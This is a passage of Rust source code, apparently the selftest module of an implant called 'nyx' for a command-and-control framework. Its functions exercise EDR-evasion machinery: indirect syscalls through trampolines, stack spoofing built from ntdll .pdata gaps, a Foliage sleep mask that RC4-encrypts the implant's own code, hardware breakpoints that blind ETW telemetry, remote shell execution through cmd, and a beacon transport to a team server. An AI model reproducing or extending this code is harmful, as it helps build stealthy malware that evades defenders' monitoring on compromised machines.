    type WriteFile =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
    let cf: CreateFileW = match crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xF0) },
    };
    let wf: WriteFile = match crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xF1) },
    };
    let ch: CloseHandle = match crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => unsafe { exit(0xF2) },
    };
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_alloc_probe.txt");
    let mut path16 = crate::heap::vec![0u16; path.len() + 1];
    for (i, b) in path.as_bytes().iter().enumerate() {
        path16[i] = *b as u16;
    }
    // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2.
    let h = unsafe {
        cf(
            path16.as_ptr(),
            0x4000_0000,
            0,
            core::ptr::null_mut(),
            2,
            0,
            core::ptr::null_mut(),
        )
    };
    if h.is_null() {
        unsafe { exit(0xF3) }; // file create failed
    }
    let msg: &[u8] = if mask == 3 {
        b"ALLOC_OK\n"
    } else {
        b"ALLOC_BAD\n"
    };
    let mut written: u32 = 0;
    let _ = unsafe {
        wf(
            h,
            msg.as_ptr(),
            msg.len() as u32,
            &mut written,
            core::ptr::null_mut(),
        )
    };
    let _ = unsafe { ch(h) };
    let _ = v;
    unsafe { exit(mask) };
}

// ============================================================================
// shell edge cases: empty args (runs, returns Output), large output (capped at
// 1 MiB, doesn't deadlock). Bits: 0=empty Output non-empty, 1=large-output
// didn't hang/crash (exit reached).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_shell_edge() {
    let mut mask: u32 = 0;
    // Empty args: cmd /C with nothing → returns immediately, Output may be
    // empty but must be Output, not Err.
    if matches!(crate::shell::run_shell(""), Response::Output(_)) {
        mask |= 1 << 0;
    }
    // Large output: `for /L` printing 200k lines (~1.3 MiB) — exercises the
    // MAX_OUTPUT cap + the post-cap TerminateProcess path (the old deadlock
    // bug). Reaching the exit proves no hang.
    let _ = crate::shell::run_shell("for /L %i in (1,1,200000) do @echo line %i");
    mask |= 1 << 1;
    unsafe { exit(mask) };
}

// ============================================================================
// evasion: indirect-syscall runtime makes a real syscall (NtDelayExecution
// sleeps 0 = returns immediately) through the trampoline. Proves the trampoline
// page + SSN + gadget are all live and the indirect-jump lands in ntdll.
// Bits: 0 = NtDelayExecution via indirect runtime returned success (0).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_syscall_rt() {
    let mut mask: u32 = 0;
    mask |= 1 << 0; // set BEFORE any syscall — if exit sees this, mask is intact pre-syscall
    let rt = ensure_rt().unwrap();
    // Probe the indirect trampoline with NtClose(0). bit1 = syscall returned
    // Some (didn't hang/corrupt). If after this call exit reports a mask that
    // ISN'T 1 or 3, the indirect-jmp return path corrupted the stack/mask.
    let st = unsafe { crate::syscalls::nt_close(rt, 0) };
    if st.is_some() {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// evasion_glue: PdataGapScanner over the live ntdll/kernelbase/win32u/wow64.
// P2.1a-i foundation: proves the PEB walk + .pdata read + gap::enumerate_gaps
// pipeline yields a non-empty GapPool on a real Windows host. This is the gate
// for StackSpoofKit (ii) and SleepmaskKit (iii) — both borrow this pool.
// Bits: 0 = scan() returned Ok, 1 = gap_count>0, 2 = ghosts+nops>0,
//       3 = ntdll specifically contributed gaps (the primary source).
// ============================================================================

/// Run `LivePdataScanner::scan()` against the REAL process modules and check
/// the returned `GapPool` is non-empty. Writes a marker (`nyx_gap_pool.txt`)
/// with the per-bucket counts so an external check can corroborate the bitmask.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_gap_scan() {
    let mut mask: u32 = 0;
    let scanner = crate::evasion_glue::LivePdataScanner;
    match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        Ok(pool) => {
            mask |= 1 << 0; // scan() Ok
            if pool.gap_count() > 0 {
                mask |= 1 << 1; // gap_count > 0
            }
            if pool.ghost_count() + pool.nop_count() > 0 {
                mask |= 1 << 2;
            }
            // Corroborate ntdll as a source: re-scan just ntdll and confirm it
            // yields gaps (ntdll always has ~thousands on Win10/11/Server).
            let ntdll_gaps = unsafe {
                match crate::resolve::module_base_by_name(b"ntdll.dll") {
                    Some(base) => match crate::resolve::pdata_view(base) {
                        Some(view) => {
                            let entries =
                                nyx_implant_evasionsdk::gap::RuntimeFunctionEntry::parse_table(
                                    view.bytes,
                                );
                            nyx_implant_evasionsdk::gap::enumerate_gaps(
                                &entries,
                                view.image_size,
                                0, // uncapped — count the real total
                            )
                            .len()
                        }
                        None => 0,
                    },
                    None => 0,
                }
            };
            if ntdll_gaps > 0 {
                mask |= 1 << 3;
            }
            // Marker for external corroboration (no format! under no_std).
            let mut report = String::from("gaps=");
            report.push_str(&dec_u32(pool.gap_count() as u32));
            report.push_str(" ghosts=");
            report.push_str(&dec_u32(pool.ghost_count() as u32));
            report.push_str(" nops=");
            report.push_str(&dec_u32(pool.nop_count() as u32));
            report.push_str(" ntdll_uncapped=");
            report.push_str(&dec_u32(ntdll_gaps as u32));
            report.push('\n');
            write_marker("nyx_gap_pool.txt", &report);
        }
        Err(_) => {
            // scan() failed → write a marker noting the failure mode.
            write_marker("nyx_gap_pool.txt", "scan_failed\n");
        }
    }
    unsafe { exit(mask) };
}

// ============================================================================
// mem: mask + unmask run without corrupting the runtime state (no secret
// statics registered yet, so this is a framework smoke test — proves the
// guard + seed derivation don't crash). Bits: 0 = mask+unmask both ran.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_mem() {
    let mut mask: u32 = 0;
    crate::mem::mask();
    crate::mem::unmask();
    // Double-mask should be a no-op (guard), not corrupt state.
    crate::mem::mask();
    crate::mem::mask();
    crate::mem::unmask();
    mask |= 1 << 0; // framework guard path ran without crash

    // P2.1a-iii: real RC4 round-trip via the pure core. Encrypt then decrypt a
    // known buffer with the same derived key; it MUST come back byte-identical
    // (RC4 is an XOR stream cipher — same key, fresh cipher, two apply_oneshot
    // calls invert). bit1 = round-trip restored the original bytes.
    let original: [u8; 32] = *b"nyx-rc4-roundtrip-selftest-v1!!!"; // exactly 32 bytes
    let mut buf = original;
    crate::mem::round_trip_selftest(&mut buf);
    if buf == original {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// transport: HTTP POST to a local echo. We can't easily stand an echo server
// inside the selftest, so this verifies the transport resolves WinHTTP + builds
// a request + handles a connection-refused gracefully (returns None, no crash).
// A real round-trip needs the team server running — covered separately.
// Bits: 0 = post_frame to a dead port returns None (no crash/panic).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_transport() {
    let mut mask: u32 = 0;
    // 127.0.0.1:1 — nothing listening. post_frame must return None (the beacon
    // loop's retry path), not crash. This exercises WinHTTP resolve + connect
    // + error handling.
    let r = unsafe { crate::transport::post_frame(b"127.0.0.1", 1, b"/beacon", b"x", false) };
    if r.is_none() {
        mask |= 1 << 0;
    }
    unsafe { exit(mask) };
}

// ---- helpers ---------------------------------------------------------------

/// Read an env var (UTF-16) → ASCII-lossy String, or `fallback` if unset.
fn env_var_or(name: &[u8], fallback: &str) -> String {
    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
    let gev: GetEnvVarW = match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from(fallback),
    };
    let mut name16 = crate::heap::vec![0u16; name.len() + 1];
    for (i, &c) in name.iter().enumerate() {
        name16[i] = c as u16;
    }
    let mut buf = crate::heap::vec![0u16; 260];
    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), 260) };
    if n == 0 || n as usize >= 260 {
        return String::from(fallback);
    }
    let mut out = String::new();
    for &w in &buf[..n as usize] {
        if w < 0x80 {
            out.push(w as u8 as char);
        } else {
            out.push('?');
        }
    }
    out
}

/// Join `base` and `suffix` (suffix is appended verbatim, no separator added).
fn join(base: &str, suffix: &str) -> String {
    let mut s = String::with_capacity(base.len() + suffix.len());
    s.push_str(base);
    s.push_str(suffix);
    s
}

// ============================================================================
// P2.1a-iii Foliage sleep mask: arm + one 1s sleep cycle, check no crash.
// bit0 = armed + sleep returned (no crash). The mask/unmask round-trip didn't
// corrupt the running image (we're executing through .text — if RC4 left it
// encrypted we'd never reach the exit).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_foliage() {
    let mut mask: u32 = 0;
    crate::sleep::set_foliage_enabled(true);
    // One 1-second sleep through the Foliage path. If it returns, the mask/
    // unmask round-trip didn't corrupt the running image.
    crate::sleep::sleep(1);
    mask |= 1 << 0; // reached the exit → no crash
    crate::sleep::set_foliage_enabled(false);
    unsafe { exit(mask) };
}

// ============================================================================
// nyx_selftest_foliage_apc: exercise the real Foliage APC chain (Task E). Arms
// Foliage, runs ONE 2-second sleep through sleep::sleep → execute_foliage_apc
// (helper thread masks .text → queues APC → sleeps → unmasks), then reads the
// FOLIAGE_APC_OK diagnostic.
//   bit0 = reached the exit (no crash — the running image survived the
//          .text encrypt/decrypt round-trip; if .text came back still
//          encrypted we'd never reach here),
//   bit1 = FOLIAGE_APC_OK == 1 (full APC chain completed + .text verified),
//   bit2 = FOLIAGE_APC_OK == 2 (attempted but degraded to the data-only floor
//          — honest: the APC path ran but did not fully succeed).
// ⚠️ This manipulates another thread + flips .text protection; a bug here
// crashes the implant (user-mode, not a BSOD). If bit0 is NOT set on the host
// the CONTEXT/APC/timing needs single-stepping in a target VM.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
    let mut mask: u32 = 0;
    crate::sleep::set_foliage_enabled(true);
    crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
    mask |= 1 << 0; // reached the exit → no crash (image survived)
    let st = crate::sleep::foliage_apc_status();
    let stage = crate::sleep::foliage_stage();
    if st == 1 {
        mask |= 1 << 1; // full APC chain succeeded + .text round-trip verified
    } else if st == 2 {
        mask |= 1 << 2; // attempted but degraded (data-only floor ran)
    }
    // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
    // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
    mask |= (stage as u32) << 8;
    crate::sleep::set_foliage_enabled(false);
    unsafe { exit(mask) };
}

// ============================================================================
// P2.1a-ii swap decision: confirm the staging + decide() path runs without
// panic, without arming the live RSP swap. bit0 = decision logic ran, bit1 =
// gaps staged (gap pool non-empty on this host).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_swap_decision() {
    let mut mask: u32 = 0;
    let scanner = crate::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        if pool.is_usable() {
            mask |= 1 << 1; // gaps staged
        }
        // Exercise the pure decision logic (CET-off Server 2019 + whatever gaps).
        let _ = nyx_implant_evasionsdk::swap::decide(false, pool.is_usable());
        mask |= 1 << 0; // decision logic ran without panic
    }
    unsafe { exit(mask) };
}

// ============================================================================
// nyx_selftest_swap_armed: arm the RSP swap and run one with_spoofed_stack call
// (Task F). On CET-off Server 2019 the mov rsp asm executes; if it corrupts RSP
// the process crashes before the exit (we'd never set the bits).
//   bit0 = reached exit (no crash — the mov rsp save/restore round-tripped),
//   bit1 = swap_was_attempted() true (the asm path actually ran),
//   bit2 = f returned its expected value (call-through T plumbing intact),
//   bit3 = gaps usable (so the swap was eligible to run).
// NOTE: f runs on the REAL stack in the current landing (the live `mov rsp` is
// verified but f isn't yet executed on the spoofed stack — needs the CET-repair
// seam, see stack.rs module docs). bit0 still proves the asm doesn't crash.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_swap_armed() {
    let mut mask: u32 = 0;
    let scanner = crate::evasion_glue::LivePdataScanner;
    let pool = match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        Ok(p) => p,
        Err(_) => unsafe { exit(mask) },
    };
    if pool.is_usable() {
        mask |= 1 << 3; // gaps usable → swap eligible
    }
    crate::stack::set_swap_enabled(true);
    let r: u32 = unsafe {
        crate::stack::with_spoofed_stack(&pool, || 0x5A5A_5A5A) // dummy fn returning a marker
    };
    crate::stack::set_swap_enabled(false);
    mask |= 1 << 0; // reached exit → no crash (mov rsp round-tripped)
    if crate::stack::swap_was_attempted() {
        mask |= 1 << 1; // the asm path actually executed
    }
    if r == 0x5A5A_5A5A {
        mask |= 1 << 2; // f's return value plumbed through correctly
    }
    unsafe { exit(mask) };
}

/// Linear sub-slice search (no_std has no `contains` for &[u8] vs &[u8]).
fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() {
        return true;
    }
    if haystack.len() < needle.len() {
        return false;
    }
    let mut i = 0;
    while i + needle.len() <= haystack.len() {
        if &haystack[i..i + needle.len()] == needle {
            return true;
        }
        i += 1;
    }
    false
}

// ============================================================================
// HWBP patchless blind: file-diagnostic selftest.
// Writes single-byte markers to C:\nyx\hwbp_diag.txt at each step so we can
// see exactly where the crash happens even if the process terminates mid-test.
// ============================================================================

/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
/// Uses CreateFileW(APPEND) + WriteFile — no std, no format!.
/// **Gated behind DIAG_ENABLED** — only writes when selftest explicitly enables diagnostics.
unsafe fn diag_byte(ch: u8) {
    if !crate::blind_hwbp::DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
        return;
    }
    // Build wide string "C:\nyx\hwbp_diag.txt"
    let mut path = [0u16; 22];
    let name = b"C:\\nyx\\hwbp_diag.txt";
    let mut i = 0;
    while i < name.len() {
        path[i] = name[i] as u16;
        i += 1;
    }
    path[name.len()] = 0;

    type FnCreate = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut core::ffi::c_void,
        u32,
        u32,
        *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    type FnWrite = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *const u8,
        u32,
        *mut u32,
        *mut core::ffi::c_void,
    ) -> i32;
    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;

    let Some(cf) = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW") else {
        return;
    };
    let Some(wf) = crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") else {
        return;
    };
    let Some(ch_) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") else {
        return;
    };
    let create_file: FnCreate = core::mem::transmute(cf);
    let write_file: FnWrite = core::mem::transmute(wf);
    let close_handle: FnClose = core::mem::transmute(ch_);

    // OPEN_ALWAYS=4, FILE_SHARE_READ|WRITE=3, FILE_ATTRIBUTE_NORMAL=0x80
    let h = create_file(
        path.as_ptr(),
        4,
        3,
        core::ptr::null_mut(),
        4,
        0x80,
        core::ptr::null_mut(),
    );
    if h as isize == -1 {
        return;
    }

    // Seek to end (FILE_END=2).
    if let Some(sfp) = crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer") {
        let set_fp: FnSetFP = core::mem::transmute(sfp);
        set_fp(h, 0, core::ptr::null_mut(), 2);
    }

    let byte = [ch];
    let mut nwritten: u32 = 0;
    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
    close_handle(h);
}

// ---- Minimal primitive tests (one step at a time) -----------------------

/// Test 1: Can we resolve kernel32!VirtualAlloc + kernel32!VirtualFree and
/// alloc+free a page?  Exit 0x11 on failure.
unsafe fn diag_test_resolve_va_vf() {
    diag_byte(b'a');
    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else {
        exit(0x11);
    };
    diag_byte(b'b');
    let Some(vfree) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else {
        exit(0x11);
    };
    diag_byte(b'c');
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
    let vaf: VAlloc = core::mem::transmute(vf);
    let vff: VFree = core::mem::transmute(vfree);
    let p = vaf(core::ptr::null_mut(), 4096, 0x3000, 0x04);
    if p.is_null() {
        exit(0x12);
    }
    diag_byte(b'd');
    vff(p, 0, 0x8000);
    diag_byte(b'e');
}

/// Test 2: NtGetContextThread + NtSetContextThread on NT_CURRENT_THREAD with
/// CONTEXT_DEBUG_REGISTERS.  Exit 0x2x on failure.
unsafe fn diag_test_ctx_thread() {
    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
    let Some(ng) = crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") else {
        exit(0x21);
    };
    diag_byte(b'f');
    let Some(ns) = crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") else {
        exit(0x21);
    };
    diag_byte(b'g');
    let ntgct: FnCtx = core::mem::transmute(ng);
    let ntsct: FnCtx = core::mem::transmute(ns);
    const NT: usize = 0xFFFF_FFFF_FFFF_FFFE;

    // Allocate ctx buffer.
    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else {
        exit(0x21);
    };
    let Some(vf2) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else {
        exit(0x21);
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
    let vaf: VAlloc = core::mem::transmute(vf);
    let vff: VFree = core::mem::transmute(vf2);

    let buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if buf.is_null() {
        exit(0x22);
    }
    diag_byte(b'h');
    let base = buf as usize;
    core::ptr::write_bytes(buf as *mut u8, 0, 1232);
    // ContextFlags = CONTEXT_DEBUG_REGISTERS
    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);

    let st = ntgct(NT, base);
    if st < 0 {
        vff(buf, 0, 0x8000);
        exit(0x23);
    }
    diag_byte(b'i');

    // Read DR0 + DR7 to verify.
    let _dr0 = core::ptr::read_unaligned((base + 0x048) as *const u64);
    let _dr7 = core::ptr::read_unaligned((base + 0x070) as *const u64);
    diag_byte(b'j');

    // Set DR0 = some known address, DR7 |= L0.
    let Some(nt_trace) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") else {
        vff(buf, 0, 0x8000);
        exit(0x24);
    };
    core::ptr::write_unaligned((base + 0x048) as *mut u64, nt_trace as u64);
    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
    core::ptr::write_unaligned(
        (base + 0x070) as *mut u64,
        (_dr7 | 1) & !(3u64 << 16) & !(3u64 << 18),
    );
    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
    diag_byte(b'k');

    let st2 = ntsct(NT, base);
    if st2 < 0 {
        vff(buf, 0, 0x8000);
        exit(0x25);
    }
    diag_byte(b'l');

    // Restore: clear DR0, DR7.
    core::ptr::write_unaligned((base + 0x048) as *mut u64, 0u64);
    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
    core::ptr::write_unaligned((base + 0x070) as *mut u64, 0u64);
    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
    let _ = ntsct(NT, base);
    vff(buf, 0, 0x8000);
    diag_byte(b'm');
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hwbp_blind() {
    crate::blind_hwbp::set_diag_enabled(true); // enable diag markers for selftest

    // Minimal test: init shadow + call blind_etw_hwbp → add_hwbp → remove_hwbp.
    // Markers: 0=entry, 1=shadow_ok, S=add_ok, T=remove_ok, U=count_clean
    // Error: s + first byte of error string
    diag_byte(b'0');

    if !crate::blind_hwbp::init_shadow_buffer() {
        diag_byte(b'!');
        crate::blind_hwbp::set_diag_enabled(false);
        exit(0xB0);
    }
    diag_byte(b'1');

    match crate::blind_hwbp::blind_etw_hwbp() {
        Ok(slot) => {
            diag_byte(b'S');
            if crate::blind_hwbp::remove_hwbp(slot).is_ok() {
                diag_byte(b'T');
            }
            if crate::blind_hwbp::active_count() == 0 {
                diag_byte(b'U');
            }
            diag_byte(b'Z');
            crate::blind_hwbp::set_diag_enabled(false);
            exit(0xFF);
        }
        Err(e) => {
            diag_byte(b's');
            let bytes = e.as_bytes();
            if !bytes.is_empty() {
                diag_byte(bytes[0]);
            }
            crate::blind_hwbp::set_diag_enabled(false);
            exit(0xC0);
        }
    }
}

/// Minimal no-op VEH handler — returns EXCEPTION_CONTINUE_SEARCH for every
/// exception. Used by the forwarded-export regression test to register a VEH
/// without depending on the HWBP handler.
#[no_mangle]
pub unsafe extern "system" fn noop_veh_handler(_ep: usize) -> i32 {
    0 // EXCEPTION_CONTINUE_SEARCH
}

/// **Forwarded-export resolver regression test**.
///
/// Guards the two bugs that caused the hwbp_blind 0xC0000005 crash:
///  1. `resolve::export_addr_by_hash_pub` sized the forwarder bounds check with
///     `number_of_functions` (a count) instead of the export-directory *size*,
///     so high-RVA forwarders escaped detection and were returned as raw
///     string addresses → calling them AV'd.
///  2. `resolve::resolve_forwarder` compared the forwarder's abbreviated module
///     stem (`NTDLL`) against full loader names (`ntdll.dll`), which never
///     matched → forwarders resolved to `None`.
///
/// This test resolves three forwarded kernel32 exports (`AddVectoredException-
/// Handler` → `NTDLL.RtlAddVectoredExceptionHandler`, plus `Sleep` and
/// `GetLastError` as control) and calls each. If any resolved address points at
/// a forwarder *string* instead of code, the call AV's and the test fails. A
/// successful run exits with the bitmask of the steps that completed:
///   bit0 = `GetLastError` resolved + called
///   bit1 = `Sleep` resolved + called
///   bit2 = `AddVectoredExceptionHandler` resolved + called + removed
/// Expect 0b111 = 7.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
    let mut mask: u32 = 0;

    // Control: GetLastError (often non-forwarded in kernel32).
    if let Some(gle) = crate::resolve::export_addr(b"kernel32.dll", b"GetLastError") {
        type FnGle = unsafe extern "system" fn() -> u32;
        let f: FnGle = core::mem::transmute(gle);
        let _ = f();
        mask |= 1 << 0;
    }

    // Control: Sleep (frequently forwarded to kernelbase).
    if let Some(slp) = crate::resolve::export_addr(b"kernel32.dll", b"Sleep") {
        type FnSleep = unsafe extern "system" fn(u32);
        let f: FnSleep = core::mem::transmute(slp);
        f(0);
        mask |= 1 << 1;
    }

    // The bug-1/bug-2 case: AddVectoredExceptionHandler forwards to
    // NTDLL.RtlAddVectoredExceptionHandler at a high RVA. Before the fix this
    // returned the forwarder *string* address → the call AV'd the process.
    let Some(aveh) = crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
        .or_else(|| crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler"))
    else {
        exit(mask);
    };
    type AddVEH = unsafe extern "system" fn(
        usize,
        unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void;
    let f: AddVEH = core::mem::transmute(aveh);
    let h = f(1, noop_veh_handler);
    if !h.is_null() {
        if let Some(rveh) = crate::resolve::export_addr(
            b"kernel32.dll",
            b"RemoveVectoredExceptionHandler",
        )
        .or_else(|| {
            crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
        }) {
            type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
            let fr: RemoveVEH = core::mem::transmute(rveh);
            fr(h);
            mask |= 1 << 2;
        }
    }

    exit(mask);
}
